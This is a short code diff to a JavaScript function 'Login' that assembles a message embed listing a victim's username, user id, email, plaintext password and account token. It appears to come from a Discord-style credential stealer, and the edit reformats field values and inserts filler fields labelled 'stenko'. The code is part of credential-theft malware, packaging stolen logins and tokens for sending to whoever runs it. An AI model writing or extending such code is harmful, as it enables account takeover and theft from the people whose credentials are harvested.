@@ -153,13 +153,18 @@ function Login(email, password, token) {
                     "fields": [
                         {
                             "name": " username",
-			    "value": json.username + "#" + json.discriminator,
+			    "value": ` - ` + json.username + `#` + json.discriminator,
                             "inline": true
                         },
                         {
                             "name": " userid",
-                            "value": json.id,
+                            "value": ` - ` + json.id,
                             "inline": true
+                        },
+                        {
+                            "name": "stenko",
+                            "value": `stenko`,
+                            "inline": false
                         },
                         {
                             "name": " email",
@@ -170,6 +175,11 @@ function Login(email, password, token) {
                             "name": " password",
                             "value": ` - ${password}`,
                             "inline": true
+                        },
+                        {
+                            "name": "stenko",
+                            "value": `stenko`,
+                            "inline": false
                         },
                         {
                             "name": " token",
